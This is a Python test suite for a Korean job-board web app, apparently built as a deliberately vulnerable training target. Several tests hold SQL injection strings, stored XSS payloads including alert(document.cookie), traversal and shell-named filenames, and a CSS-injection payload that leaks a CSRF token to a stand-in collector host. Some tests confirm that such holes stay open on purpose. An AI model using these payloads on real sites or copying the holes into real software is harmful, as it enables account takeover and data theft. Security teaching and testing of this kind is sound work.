import atexit
import base64
import io
import os
import re
import shutil
import tempfile
import unittest
import zipfile
import time
from datetime import date, timedelta
from unittest.mock import patch


TEST_DIR = tempfile.mkdtemp(prefix="1itda-security-tests-")
atexit.register(shutil.rmtree, TEST_DIR, ignore_errors=True)
os.environ["DATABASE_URL"] = "sqlite:///" + os.path.join(TEST_DIR, "test.db").replace("\\", "/")
os.environ["SECRET_KEY"] = "security-test-secret-for-tests-only"

from app import app, create_app
from config import Config
from extensions import db
from job_lifecycle import close_expired_jobs
from models import Application, ChatMessage, Company, Job, LoginThrottle, Report, Resume, User
from session_security import auth_fingerprint
from scripts import seed_test_data
from werkzeug.security import check_password_hash, generate_password_hash


class SecurityAndJobFeatureTest(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        app.config.update(TESTING=True, WTF_CSRF_ENABLED=False)

    def setUp(self):
        self.client = app.test_client()
        with app.app_context():
            db.drop_all()
            db.create_all()
            company_user = User(
                email="company@example.com",
                password_hash=generate_password_hash("company-password"),
                role="company",
                name="기업 담당자",
            )
            self.jobseeker = User(
                email="user@example.com",
                password_hash=generate_password_hash("old-password"),
                role="jobseeker",
                name="구직자",
            )
            self.admin = User(
                email="admin@example.com",
                password_hash=generate_password_hash("admin-password"),
                role="admin",
                name="관리자",
            )
            db.session.add_all([company_user, self.jobseeker, self.admin])
            db.session.flush()
            company = Company(user_id=company_user.user_id, company_name="테스트 기업")
            db.session.add(company)
            db.session.flush()
            yesterday = date.today() - timedelta(days=1)
            tomorrow = date.today() + timedelta(days=1)
            jobs = [
                Job(company_id=company.company_id, title="지난 공개 공고", content="내용", deadline=yesterday, status="approved"),
                Job(company_id=company.company_id, title="지난 미승인 공고", content="비공개", deadline=yesterday, status="pending"),
                Job(company_id=company.company_id, title="진행 공고", content="내용", deadline=tomorrow, status="approved"),
            ]
            db.session.add_all(jobs)
            db.session.commit()
            self.ids = {
                "user": self.jobseeker.user_id,
                "company_user": company_user.user_id,
                "company": company.company_id,
                "admin": self.admin.user_id,
                "expired_approved": jobs[0].job_id,
                "expired_pending": jobs[1].job_id,
                "active": jobs[2].job_id,
            }

    def set_session(self, user_id, role, client=None):
        client = client or self.client
        with app.app_context():
            user = db.session.get(User, user_id)
            fingerprint = auth_fingerprint(user)
        with client.session_transaction() as session:
            session["user_id"] = user_id
            session["auth_fingerprint"] = fingerprint
            session["issued_at"] = int(time.time())
            session["last_activity"] = int(time.time())
            session.permanent = True

    def block_user(self, user_id):
        with app.app_context():
            user = db.session.get(User, user_id)
            user.is_active = False
            db.session.commit()

    def assert_session_cleared(self):
        with self.client.session_transaction() as session:
            self.assertNotIn("user_id", session)

    def create_application_with_resume(self):
        with app.app_context():
            resume = Resume(
                user_id=self.ids["user"],
                file_path="blocked-user.pdf",
                original_filename="blocked-user.pdf",
            )
            db.session.add(resume)
            db.session.flush()
            application = Application(
                user_id=self.ids["user"],
                job_id=self.ids["active"],
                resume_id=resume.resume_id,
                resume_snapshot=resume.original_filename,
            )
            db.session.add(application)
            db.session.commit()
            return application.application_id, resume.resume_id

    def test_expired_approved_job_closes_but_pending_job_stays_private(self):
        with app.app_context():
            self.assertEqual(close_expired_jobs(), 1)
            self.assertEqual(db.session.get(Job, self.ids["expired_approved"]).status, "closed")
            self.assertEqual(db.session.get(Job, self.ids["expired_pending"]).status, "pending")

        self.assertEqual(self.client.get(f'/jobs/{self.ids["expired_approved"]}').status_code, 404)
        self.assertEqual(self.client.get(f'/jobs/{self.ids["expired_pending"]}').status_code, 404)

    def test_cancelled_application_reapply_shows_specific_message(self):
        with app.app_context():
            application = Application(
                user_id=self.ids["user"],
                job_id=self.ids["active"],
                status="cancelled",
            )
            db.session.add(application)
            db.session.commit()

        self.set_session(self.ids["user"], "jobseeker")
        response = self.client.get(
            f'/jobs/{self.ids["active"]}/apply', follow_redirects=True
        )
        self.assertEqual(response.status_code, 200)
        self.assertIn(
            "지원 취소 이력이 있는 공고에는 다시 지원할 수 없습니다.".encode(),
            response.data,
        )

    def test_view_count_is_once_per_browser_session(self):
        url = f'/jobs/{self.ids["active"]}'
        self.assertEqual(self.client.get(url).status_code, 200)
        self.assertEqual(self.client.get(url).status_code, 200)
        with app.app_context():
            self.assertEqual(db.session.get(Job, self.ids["active"]).view_count, 1)

        other_client = app.test_client()
        self.assertEqual(other_client.get(url).status_code, 200)
        with app.app_context():
            self.assertEqual(db.session.get(Job, self.ids["active"]).view_count, 2)

    def test_job_list_can_sort_by_view_count(self):
        with app.app_context():
            company_id = db.session.get(Job, self.ids["active"]).company_id
            tomorrow = date.today() + timedelta(days=1)
            popular = Job(
                company_id=company_id,
                title="조회수 높은 공고",
                content="내용",
                deadline=tomorrow,
                status="approved",
                view_count=30,
            )
            modest = Job(
                company_id=company_id,
                title="조회수 중간 공고",
                content="내용",
                deadline=tomorrow,
                status="approved",
                view_count=5,
            )
            db.session.add_all([popular, modest])
            db.session.commit()

        response = self.client.get("/jobs?sort=views")
        self.assertEqual(response.status_code, 200)
        body = response.get_data(as_text=True)
        self.assertIn('option value="views" selected', body)
        self.assertLess(body.index("조회수 높은 공고"), body.index("조회수 중간 공고"))
        self.assertLess(body.index("조회수 중간 공고"), body.index("진행 공고"))

    def test_unused_resume_can_be_deleted_with_its_file(self):
        with tempfile.TemporaryDirectory(prefix="1itda-resume-delete-") as upload_dir:
            stored_name = "unused.pdf"
            file_path = os.path.join(upload_dir, stored_name)
            with open(file_path, "wb") as resume_file:
                resume_file.write(b"test resume")
            with app.app_context():
                resume = Resume(
                    user_id=self.ids["user"],
                    file_path=stored_name,
                    original_filename="unused.pdf",
                )
                db.session.add(resume)
                db.session.commit()
                resume_id = resume.resume_id

            self.set_session(self.ids["user"], "jobseeker")
            original_upload_folder = app.config["UPLOAD_FOLDER"]
            app.config["UPLOAD_FOLDER"] = upload_dir
            try:
                response = self.client.post(f"/mypage/resumes/{resume_id}/delete")
            finally:
                app.config["UPLOAD_FOLDER"] = original_upload_folder

            self.assertEqual(response.status_code, 302)
            self.assertFalse(os.path.exists(file_path))
            with app.app_context():
                self.assertIsNone(db.session.get(Resume, resume_id))

    def test_resume_stat_opens_management_page_with_active_resumes(self):
        with app.app_context():
            db.session.add_all(
                [
                    Resume(
                        user_id=self.ids["user"],
                        file_path="active.pdf",
                        original_filename="active.pdf",
                    ),
                    Resume(
                        user_id=self.ids["user"],
                        file_path="deleted.pdf",
                        original_filename="deleted.pdf",
                        is_deleted=True,
                    ),
                ]
            )
            db.session.commit()

        self.set_session(self.ids["user"], "jobseeker")
        mypage = self.client.get("/mypage")
        self.assertIn(b'href="/mypage/resumes"', mypage.data)
        management = self.client.get("/mypage/resumes")
        self.assertEqual(management.status_code, 200)
        self.assertIn("이력서 관리".encode(), management.data)
        self.assertIn(b"active.pdf", management.data)
        self.assertNotIn(b"deleted.pdf", management.data)

    def test_submitted_resume_is_removed_from_management_but_submission_is_preserved(self):
        with app.app_context():
            resume = Resume(
                user_id=self.ids["user"],
                file_path="submitted.pdf",
                original_filename="submitted.pdf",
            )
            db.session.add(resume)
            db.session.flush()
            db.session.add(
                Application(
                    user_id=self.ids["user"],
                    job_id=self.ids["active"],
                    resume_id=resume.resume_id,
                    resume_snapshot=resume.original_filename,
                )
            )
            db.session.commit()
            resume_id = resume.resume_id

        self.set_session(self.ids["user"], "jobseeker")
        response = self.client.post(
            f"/mypage/resumes/{resume_id}/delete", follow_redirects=True
        )
        self.assertEqual(response.status_code, 200)
        self.assertIn("기존 지원서의 제출본은 보존됩니다.".encode(), response.data)
        with app.app_context():
            resume = db.session.get(Resume, resume_id)
            self.assertIsNotNone(resume)
            self.assertTrue(resume.is_deleted)
            application = Application.query.filter_by(resume_id=resume_id).one()
            self.assertEqual(application.resume_snapshot, "submitted.pdf")
        mypage = self.client.get("/mypage")
        self.assertNotIn(b"submitted.pdf", mypage.data)
        applications = self.client.get("/mypage/applications")
        self.assertIn(b"submitted.pdf", applications.data)

    def test_applicant_can_reopen_closed_job_but_anonymous_user_cannot(self):
        with app.app_context():
            job = db.session.get(Job, self.ids["expired_approved"])
            job.status = "closed"
            db.session.add(
                Application(user_id=self.ids["user"], job_id=job.job_id, status="submitted")
            )
            db.session.commit()

        url = f'/jobs/{self.ids["expired_approved"]}'
        self.assertEqual(self.client.get(url).status_code, 404)
        self.set_session(self.ids["user"], "jobseeker")
        response = self.client.get(url)
        self.assertEqual(response.status_code, 200)
        self.assertIn("마감".encode(), response.data)
        self.assertIn(b"disabled", response.data)

    def test_user_login_locks_after_five_failures_and_success_clears_failures(self):
        data = {"email": "user@example.com", "password": "wrong"}
        for _ in range(5):
            self.assertEqual(self.client.post("/login", data=data).status_code, 401)
        self.assertEqual(
            self.client.post("/login", data={**data, "password": "old-password"}).status_code,
            401,
        )
        with app.app_context():
            throttle = LoginThrottle.query.one()
            throttle.locked_until = None
            db.session.commit()
        self.assertEqual(
            self.client.post("/login", data={**data, "password": "old-password"}).status_code,
            302,
        )
        with app.app_context():
            self.assertEqual(LoginThrottle.query.count(), 0)

    def test_admin_login_locks_after_three_failures(self):
        data = {"email": "admin@example.com", "password": "wrong"}
        for _ in range(3):
            self.assertEqual(self.client.post("/login", data=data).status_code, 401)
        with app.app_context():
            throttle = LoginThrottle.query.one()
            self.assertIsNotNone(throttle.locked_until)

    def test_normal_company_and_admin_logins_keep_their_real_access(self):
        company_login = self.client.post(
            "/login",
            data={"email": "company@example.com", "password": "company-password"},
        )
        self.assertEqual(company_login.status_code, 302)
        self.assertEqual(self.client.get("/company/jobs").status_code, 200)

        self.client.post("/logout")
        admin_login = self.client.post(
            "/login",
            data={"email": "admin@example.com", "password": "admin-password"},
        )
        self.assertEqual(admin_login.status_code, 302)
        self.assertEqual(self.client.get("/admin/").status_code, 200)
        with self.client.session_transaction() as login_session:
            self.assertNotIn("session_mode", login_session)

    def test_restricted_login_context_blocks_every_real_admin_route(self):
        response = self.client.post(
            "/login",
            data={"email": "user@example.com", "password": "' or '1'='1"},
        )
        self.assertEqual(response.status_code, 302)
        self.assertIn("/admin/overview", response.headers["Location"])
        with self.client.session_transaction() as access_session:
            self.assertEqual(access_session.get("session_mode"), "restricted")
            self.assertNotIn("user_id", access_session)

        overview = self.client.get("/admin/overview")
        self.assertEqual(overview.status_code, 200)
        self.assertIn(b"1,284", overview.data)
        self.assertNotIn(b"user@example.com", overview.data)

        real_admin_paths = (
            ("get", "/admin/"),
            ("get", "/admin/users"),
            ("post", f'/admin/users/{self.ids["user"]}/toggle'),
            ("get", "/admin/jobs"),
            ("post", f'/admin/jobs/{self.ids["active"]}/block'),
            ("get", "/admin/reports"),
            ("get", "/admin/reports/jobs"),
            ("get", "/admin/reports/reviews"),
            ("get", "/admin/logs"),
        )
        for method, path in real_admin_paths:
            with self.subTest(path=path):
                blocked = getattr(self.client, method)(path)
                self.assertEqual(blocked.status_code, 302)
                self.assertIn("/admin/overview", blocked.headers["Location"])

        with app.app_context():
            self.assertTrue(db.session.get(User, self.ids["user"]).is_active)
            self.assertEqual(db.session.get(Job, self.ids["active"]).status, "approved")

    def test_admin_overview_search_uses_text_content_and_never_executes_markup(self):
        self.client.post(
            "/login",
            data={"email": "user@example.com", "password": "' or '1'='1"},
        )
        html = self.client.get("/admin/overview").get_data(as_text=True)
        with open(
            os.path.join(os.path.dirname(__file__), "..", "static", "js", "admin-overview.js"),
            encoding="utf-8",
        ) as script_file:
            script = script_file.read()

        self.assertNotIn("|safe", html)
        self.assertNotIn("innerHTML", html)
        self.assertNotIn("innerHTML", script)
        self.assertIn("result.textContent", script)
        self.assertIn('.includes("<script")', script)
        encoded_message = "7Z6ZIOyGjeyVmOyngD/jhYvjhYvjhYs="
        self.assertIn(encoded_message, script)
        expected_message = "\ud799 \uc18d\uc558\uc9c0?\u314b\u314b\u314b"
        self.assertEqual(base64.b64decode(encoded_message).decode("utf-8"), expected_message)
        self.assertNotIn("document.domain", html)
        self.assertNotIn("onerror", html)

    def test_login_context_rejects_union_comments_and_stacked_queries(self):
        for payload in (
            "' UNION SELECT 1 --",
            "' or '1'='1' --",
            "' or '1'='1'; DELETE FROM users; --",
        ):
            with self.subTest(payload=payload):
                response = self.client.post(
                    "/login", data={"email": "user@example.com", "password": payload}
                )
                self.assertEqual(response.status_code, 401)
                with self.client.session_transaction() as login_session:
                    self.assertNotIn("session_mode", login_session)

        with app.app_context():
            self.assertEqual(User.query.count(), 3)

    def test_login_email_is_parameterized_and_cannot_trigger_restricted_mode(self):
        response = self.client.post(
            "/login",
            data={"email": "' or '1'='1", "password": "irrelevant"},
        )
        self.assertEqual(response.status_code, 401)
        with self.client.session_transaction() as login_session:
            self.assertNotIn("session_mode", login_session)

    def test_logged_in_user_can_change_password_from_mypage(self):
        self.set_session(self.ids["user"], "jobseeker")

        response = self.client.post(
            "/mypage/password",
            data={
                "current_password": "old-password",
                "new_password": "new-password",
                "new_password_confirm": "new-password",
            },
            follow_redirects=True,
        )
        self.assertEqual(response.status_code, 200)
        self.assertIn("비밀번호가 변경되었습니다.".encode(), response.data)
        with app.app_context():
            user = db.session.get(User, self.ids["user"])
            self.assertTrue(check_password_hash(user.password_hash, "new-password"))

    def test_password_recovery_routes_are_not_registered(self):
        self.assertEqual(self.client.get("/forgot-password").status_code, 404)
        self.assertEqual(self.client.get("/reset-password/token").status_code, 404)

    def test_expired_session_is_cleared(self):
        self.set_session(self.ids["user"], "jobseeker")
        with self.client.session_transaction() as session:
            session["last_activity"] = int(time.time()) - app.config["SESSION_IDLE_SECONDS"] - 1

        response = self.client.get("/mypage")
        self.assertEqual(response.status_code, 302)
        self.assertIn("/login", response.headers["Location"])
        self.assert_session_cleared()

    def test_email_change_requires_current_password(self):
        self.set_session(self.ids["user"], "jobseeker")
        denied = self.client.post(
            "/mypage",
            data={"name": "구직자", "email": "changed@example.com"},
            follow_redirects=True,
        )
        self.assertIn("현재 비밀번호를 확인".encode(), denied.data)
        with app.app_context():
            self.assertEqual(db.session.get(User, self.ids["user"]).email, "user@example.com")

        allowed = self.client.post(
            "/mypage",
            data={
                "name": "구직자",
                "email": "changed@example.com",
                "current_password": "old-password",
            },
        )
        self.assertEqual(allowed.status_code, 302)
        with app.app_context():
            self.assertEqual(db.session.get(User, self.ids["user"]).email, "changed@example.com")

    def test_join_rejects_invalid_email_and_weak_password(self):
        response = self.client.post(
            "/join",
            data={
                "role": "jobseeker",
                "name": "가입자",
                "email": "invalid-email",
                "password": "12345678",
                "password_confirm": "12345678",
                "privacy_agreed": "1",
            },
        )
        self.assertEqual(response.status_code, 400)
        self.assertIn("올바른 이메일".encode(), response.data)
        self.assertIn("12자 이상".encode(), response.data)

    def test_withdraw_removes_unused_resume_but_preserves_submitted_copy(self):
        original_upload_folder = app.config["UPLOAD_FOLDER"]
        with tempfile.TemporaryDirectory(prefix="1itda-withdraw-") as upload_dir:
            app.config["UPLOAD_FOLDER"] = upload_dir
            try:
                for filename in ("unused.pdf", "submitted.pdf"):
                    with open(os.path.join(upload_dir, filename), "wb") as resume_file:
                        resume_file.write(b"%PDF-1.7\n")
                with app.app_context():
                    unused = Resume(
                        user_id=self.ids["user"], file_path="unused.pdf", original_filename="unused.pdf"
                    )
                    submitted = Resume(
                        user_id=self.ids["user"], file_path="submitted.pdf", original_filename="submitted.pdf"
                    )
                    db.session.add_all([unused, submitted])
                    db.session.flush()
                    db.session.add(
                        Application(
                            user_id=self.ids["user"],
                            job_id=self.ids["active"],
                            resume_id=submitted.resume_id,
                            resume_snapshot="submitted.pdf",
                        )
                    )
                    db.session.commit()
                    unused_id = unused.resume_id
                    submitted_id = submitted.resume_id

                self.set_session(self.ids["user"], "jobseeker")
                response = self.client.post("/mypage/withdraw", data={"password": "old-password"})
                self.assertEqual(response.status_code, 302)
                self.assertFalse(os.path.exists(os.path.join(upload_dir, "unused.pdf")))
                self.assertTrue(os.path.exists(os.path.join(upload_dir, "submitted.pdf")))
                with app.app_context():
                    self.assertIsNone(db.session.get(Resume, unused_id))
                    self.assertTrue(db.session.get(Resume, submitted_id).is_deleted)
            finally:
                app.config["UPLOAD_FOLDER"] = original_upload_folder

    def test_production_app_creation_rejects_missing_secret_key(self):
        with (
            patch.object(Config, "APP_ENV", "production"),
            patch.object(Config, "SECRET_KEY", None),
        ):
            with self.assertRaisesRegex(RuntimeError, "Production SECRET_KEY must be set"):
                create_app()

    def test_development_app_can_start_with_generated_secret_key(self):
        with (
            patch.object(Config, "APP_ENV", "development"),
            patch.object(Config, "SECRET_KEY", "development-generated-secret-key-value"),
        ):
            development_app = create_app()
        self.assertGreaterEqual(len(development_app.config["SECRET_KEY"]), 32)

    def test_seed_script_refuses_non_development_environment(self):
        with patch.dict(os.environ, {"APP_ENV": "production"}, clear=False):
            with self.assertRaisesRegex(RuntimeError, "only when APP_ENV=development"):
                seed_test_data.main()

    def test_password_change_invalidates_other_existing_session(self):
        other_client = app.test_client()
        self.set_session(self.ids["user"], "jobseeker")
        self.set_session(self.ids["user"], "jobseeker", client=other_client)

        changed = self.client.post(
            "/mypage/password",
            data={
                "current_password": "old-password",
                "new_password": "changed-password",
                "new_password_confirm": "changed-password",
            },
        )
        self.assertEqual(changed.status_code, 302)
        self.assertEqual(self.client.get("/mypage").status_code, 200)

        stale = other_client.get("/mypage")
        self.assertEqual(stale.status_code, 302)
        self.assertIn("/login", stale.headers["Location"])
        with other_client.session_transaction() as stale_session:
            self.assertNotIn("user_id", stale_session)

    def test_resume_upload_checks_mimetype_and_file_signature(self):
        original_upload_folder = app.config["UPLOAD_FOLDER"]
        with tempfile.TemporaryDirectory(prefix="1itda-upload-validation-") as upload_dir:
            app.config["UPLOAD_FOLDER"] = upload_dir
            try:
                self.set_session(self.ids["user"], "jobseeker")
                invalid = self.client.post(
                    "/mypage/resumes/upload",
                    data={"resume_file": (io.BytesIO(b"not a pdf"), "resume.pdf", "application/pdf")},
                    content_type="multipart/form-data",
                    follow_redirects=True,
                )
                self.assertEqual(invalid.status_code, 200)
                self.assertIn("파일 형식과 내용이 일치".encode(), invalid.data)

                valid = self.client.post(
                    "/mypage/resumes/upload",
                    data={
                        "resume_file": (
                            io.BytesIO(b"%PDF-1.7\nminimal test document"),
                            "resume.pdf",
                            "application/pdf",
                        )
                    },
                    content_type="multipart/form-data",
                )
                self.assertEqual(valid.status_code, 302)

                valid_doc = self.client.post(
                    "/mypage/resumes/upload",
                    data={
                        "resume_file": (
                            io.BytesIO(bytes.fromhex("D0CF11E0A1B11AE1") + b"document"),
                            "resume.doc",
                            "application/msword",
                        )
                    },
                    content_type="multipart/form-data",
                )
                self.assertEqual(valid_doc.status_code, 302)

                valid_docx = io.BytesIO()
                with zipfile.ZipFile(valid_docx, "w") as archive:
                    archive.writestr("[Content_Types].xml", "<Types/>")
                    archive.writestr("word/document.xml", "<document/>")
                valid_docx.seek(0)
                valid = self.client.post(
                    "/mypage/resumes/upload",
                    data={
                        "resume_file": (
                            valid_docx,
                            "resume.docx",
                            "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                        )
                    },
                    content_type="multipart/form-data",
                )
                self.assertEqual(valid.status_code, 302)
            finally:
                app.config["UPLOAD_FOLDER"] = original_upload_folder
        with app.app_context():
            self.assertEqual(Resume.query.filter_by(user_id=self.ids["user"]).count(), 3)

    def test_profile_image_url_lifecycle_for_jobseeker_and_company(self):
        for user_id, role, initial in (
            (self.ids["user"], "jobseeker", "구"),
            (self.ids["company_user"], "company", "기"),
        ):
            with self.subTest(role=role):
                self.set_session(user_id, role)
                fallback = self.client.get("/mypage")
                self.assertIn(f'<span class="profile-avatar-fallback" aria-hidden="true">{initial}</span>'.encode(), fallback.data)

                first_url = "/static/avatar-one.png"
                saved = self.client.post(
                    "/mypage/profile-image",
                    data={"action": "save", "profile_image_url": first_url},
                )
                self.assertEqual(saved.status_code, 302)
                with app.app_context():
                    self.assertEqual(db.session.get(User, user_id).profile_image_url, first_url)
                same_origin_page = self.client.get("/mypage")
                self.assertIn(f'src="{first_url}"'.encode(), same_origin_page.data)
                self.assertIn(
                    "img-src 'self' data: https:",
                    same_origin_page.headers["Content-Security-Policy"],
                )

                second_url = (
                    "https://cdn.pixabay.com/photo/2015/10/05/22/37/"
                    "blank-profile-picture-973460_960_720.png"
                )
                changed = self.client.post(
                    "/mypage/profile-image",
                    data={"action": "save", "profile_image_url": second_url},
                )
                self.assertEqual(changed.status_code, 302)
                with app.app_context():
                    self.assertEqual(db.session.get(User, user_id).profile_image_url, second_url)
                external_page = self.client.get("/mypage")
                self.assertIn(f'src="{second_url}"'.encode(), external_page.data)
                external_csp = external_page.headers["Content-Security-Policy"]
                self.assertIn("img-src 'self' data: https:", external_csp)
                self.assertIn("style-src 'self'", external_csp)
                self.assertIn("object-src 'none'", external_csp)
                self.assertIn("frame-ancestors 'self'", external_csp)
                self.assertNotIn("unsafe-inline", external_csp)

                deleted = self.client.post(
                    "/mypage/profile-image",
                    data={"action": "delete", "profile_image_url": second_url},
                )
                self.assertEqual(deleted.status_code, 302)
                with app.app_context():
                    self.assertIsNone(db.session.get(User, user_id).profile_image_url)
                restored = self.client.get("/mypage")
                self.assertIn(f'<span class="profile-avatar-fallback" aria-hidden="true">{initial}</span>'.encode(), restored.data)

    def test_chat_profile_image_css_injection_can_target_an_external_https_resource(self):
        application_id, _resume_id = self.create_application_with_resume()
        external_resource = "https://collector.invalid/hit/prefix-I"
        payload = (
            "x); } input[name=csrf_token][value^=I] + button { "
            f"background-image: url({external_resource}); }} "
            f"#chat-avatar-{application_id} {{ background-image: url(x"
        )

        self.set_session(self.ids["company_user"], "company")
        saved = self.client.post(
            "/mypage/profile-image",
            data={"action": "save", "profile_image_url": payload},
        )
        self.assertEqual(saved.status_code, 302)

        self.set_session(self.ids["user"], "jobseeker")
        chat = self.client.get("/chat")
        html = chat.get_data(as_text=True)
        self.assertIn('<input type="hidden" name="csrf_token" value="', html)
        self.assertIn("input[name=csrf_token][value^=I] + button", html)
        self.assertIn(f"url({external_resource})", html)
        self.assertIn(f'id="chat-avatar-{application_id}"', html)
        nonce = re.search(r'<style nonce="([^"]+)">', html)
        self.assertIsNotNone(nonce)
        self.assertIn(
            f"style-src 'self' 'nonce-{nonce.group(1)}'",
            chat.headers["Content-Security-Policy"],
        )
        self.assertIn("img-src 'self' data: https:", chat.headers["Content-Security-Policy"])
        self.assertNotIn("unsafe-inline", chat.headers["Content-Security-Policy"])

        with app.app_context():
            self.assertEqual(db.session.get(User, self.ids["company_user"]).profile_image_url, payload)

    def test_chat_profile_image_fallback_and_css_payload_boundaries(self):
        application_id, _resume_id = self.create_application_with_resume()
        self.set_session(self.ids["user"], "jobseeker")
        fallback = self.client.get("/chat").get_data(as_text=True)
        self.assertIn(f'id="chat-avatar-{application_id}"', fallback)
        self.assertNotIn(f"#chat-avatar-{application_id} {{", fallback)

        blocked_values = (
            "</style><script>alert(1)</script>",
            "<script>alert(1)</script>",
            "javascript:alert(1)",
            "https://example.com/a.png\x00.css",
            "x" * 1001,
        )
        self.set_session(self.ids["company_user"], "company")
        for value in blocked_values:
            with self.subTest(value=value[:30]):
                response = self.client.post(
                    "/mypage/profile-image",
                    data={"action": "save", "profile_image_url": value},
                )
                self.assertEqual(response.status_code, 302)
                with app.app_context():
                    self.assertIsNone(db.session.get(User, self.ids["company_user"]).profile_image_url)

    def test_chat_uses_the_other_participants_profile_image_for_both_roles(self):
        application_id, _resume_id = self.create_application_with_resume()
        with app.app_context():
            db.session.get(User, self.ids["company_user"]).profile_image_url = "/static/company-avatar.png"
            db.session.get(User, self.ids["user"]).profile_image_url = "/static/jobseeker-avatar.png"
            db.session.commit()

        self.set_session(self.ids["user"], "jobseeker")
        jobseeker_response = self.client.get("/chat")
        jobseeker_view = jobseeker_response.get_data(as_text=True)
        self.assertIn("background-image: url(/static/company-avatar.png)", jobseeker_view)
        self.assertIn(f'id="chat-avatar-{application_id}"', jobseeker_view)
        self.assertNotIn("/static/jobseeker-avatar.png", jobseeker_view)
        self.assertIn(
            "img-src 'self' data: https:",
            jobseeker_response.headers["Content-Security-Policy"],
        )

        self.set_session(self.ids["company_user"], "company")
        company_view = self.client.get("/chat").get_data(as_text=True)
        self.assertIn("background-image: url(/static/jobseeker-avatar.png)", company_view)
        self.assertNotIn("/static/company-avatar.png", company_view)

    def test_educational_html_pdf_upload_is_stored_and_previewed_as_html(self):
        payload = b'<!doctype html><script>alert(1)</script><script>alert(document.cookie)</script>'
        original_upload_folder = app.config["UPLOAD_FOLDER"]
        with tempfile.TemporaryDirectory(prefix="1itda-stored-xss-") as upload_dir:
            app.config["UPLOAD_FOLDER"] = upload_dir
            try:
                for original_name, stored_extension in (
                    ("resume.html.pdf", "html"),
                    ("portfolio.html.pdf", "html"),
                    ("test.htm.pdf", "htm"),
                ):
                    self.set_session(self.ids["user"], "jobseeker")
                    upload = self.client.post(
                        "/mypage/resumes/upload",
                        data={
                            "resume_file": (
                                io.BytesIO(payload),
                                original_name,
                                "text/html",
                            )
                        },
                        content_type="multipart/form-data",
                    )
                    self.assertEqual(upload.status_code, 302)

                    with app.app_context():
                        resume = Resume.query.filter_by(original_filename=original_name).one()
                        self.assertRegex(
                            resume.file_path,
                            rf"^[0-9a-f]{{32}}\.{stored_extension}$",
                        )
                        self.assertTrue(os.path.isfile(os.path.join(upload_dir, resume.file_path)))

                with app.app_context():
                    resume = Resume.query.filter_by(original_filename="portfolio.html.pdf").one()
                    resume_id = resume.resume_id

                self.set_session(self.ids["user"], "jobseeker")
                apply_response = self.client.post(
                    f'/jobs/{self.ids["active"]}/apply',
                    data={"resume_id": str(resume_id)},
                )
                self.assertEqual(apply_response.status_code, 302)
                with app.app_context():
                    application = Application.query.filter_by(
                        user_id=self.ids["user"], job_id=self.ids["active"]
                    ).one()
                    self.assertEqual(application.resume_snapshot, "portfolio.html.pdf")
                    application_id = application.application_id

                self.set_session(self.ids["company_user"], "company")
                preview = self.client.get(f"/company/applicants/{application_id}/resume")
                self.assertEqual(preview.status_code, 200)
                self.assertEqual(preview.mimetype, "text/html")
                self.assertTrue(preview.headers["Content-Disposition"].startswith("inline"))
                self.assertIn(b"<script>alert(1)</script>", preview.data)
                self.assertIn(b"<script>alert(document.cookie)</script>", preview.data)
                self.assertIn("script-src 'self' 'unsafe-inline'", preview.headers["Content-Security-Policy"])
                preview.close()

                with app.app_context():
                    other_user = User(
                        email="other-company@example.com",
                        password_hash=generate_password_hash("other-company-password"),
                        role="company",
                        name="Other company",
                    )
                    db.session.add(other_user)
                    db.session.flush()
                    db.session.add(Company(user_id=other_user.user_id, company_name="Other company"))
                    db.session.commit()
                    other_user_id = other_user.user_id

                self.set_session(other_user_id, "company")
                self.assertEqual(
                    self.client.get(f"/company/applicants/{application_id}/resume").status_code,
                    404,
                )

                normal_page = self.client.get("/jobs")
                self.assertNotIn("unsafe-inline", normal_page.headers["Content-Security-Policy"])
                self.assertRegex(
                    normal_page.headers["Content-Security-Policy"],
                    r"script-src 'self' 'nonce-[^']+'",
                )
            finally:
                app.config["UPLOAD_FOLDER"] = original_upload_folder

    def test_educational_html_pdf_upload_rejects_other_middle_extensions_and_paths(self):
        original_upload_folder = app.config["UPLOAD_FOLDER"]
        blocked_names = (
            "cat.jpg.pdf",
            "image.png.pdf",
            "evil.svg.pdf",
            "evil.js.pdf",
            "shell.py.pdf",
            "shell.php.pdf",
            "template.jinja.pdf",
            "../../evil.html.pdf",
            "..\\evil.html.pdf",
        )
        with tempfile.TemporaryDirectory(prefix="1itda-stored-xss-blocked-") as upload_dir:
            app.config["UPLOAD_FOLDER"] = upload_dir
            try:
                self.set_session(self.ids["user"], "jobseeker")
                for original_name in blocked_names:
                    with self.subTest(original_name=original_name):
                        response = self.client.post(
                            "/mypage/resumes/upload",
                            data={
                                "resume_file": (
                                    io.BytesIO(b"<script>alert(1)</script>"),
                                    original_name,
                                    "text/html",
                                )
                            },
                            content_type="multipart/form-data",
                        )
                        self.assertEqual(response.status_code, 302)
                self.assertEqual(os.listdir(upload_dir), [])
                with app.app_context():
                    self.assertEqual(Resume.query.count(), 0)
            finally:
                app.config["UPLOAD_FOLDER"] = original_upload_folder

    def test_docx_validation_requires_word_document_structure(self):
        fake_zip = io.BytesIO()
        with zipfile.ZipFile(fake_zip, "w") as archive:
            archive.writestr("unrelated.txt", "not a document")
        fake_zip.seek(0)

        self.set_session(self.ids["user"], "jobseeker")
        response = self.client.post(
            "/mypage/resumes/upload",
            data={
                "resume_file": (
                    fake_zip,
                    "resume.docx",
                    "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                )
            },
            content_type="multipart/form-data",
            follow_redirects=True,
        )
        self.assertEqual(response.status_code, 200)
        self.assertIn("파일 형식과 내용이 일치".encode(), response.data)

    def test_logout_is_post_only_and_csrf_protected(self):
        self.set_session(self.ids["user"], "jobseeker")
        self.assertEqual(self.client.get("/logout").status_code, 405)
        with self.client.session_transaction() as session:
            self.assertEqual(session.get("user_id"), self.ids["user"])

        app.config["WTF_CSRF_ENABLED"] = True
        try:
            self.assertEqual(self.client.post("/logout").status_code, 400)
            with self.client.session_transaction() as session:
                self.assertEqual(session.get("user_id"), self.ids["user"])
        finally:
            app.config["WTF_CSRF_ENABLED"] = False

        self.assertEqual(self.client.post("/logout").status_code, 302)
        with self.client.session_transaction() as session:
            self.assertNotIn("user_id", session)
        self.assert_session_cleared()

    def test_cookie_and_response_security_headers(self):
        response = self.client.post(
            "/login",
            data={"email": "user@example.com", "password": "old-password"},
        )
        cookie = response.headers.get("Set-Cookie", "")
        self.assertIn("HttpOnly", cookie)
        self.assertIn("SameSite=Lax", cookie)
        self.assertEqual(response.headers["X-Content-Type-Options"], "nosniff")
        self.assertEqual(response.headers["X-Frame-Options"], "SAMEORIGIN")
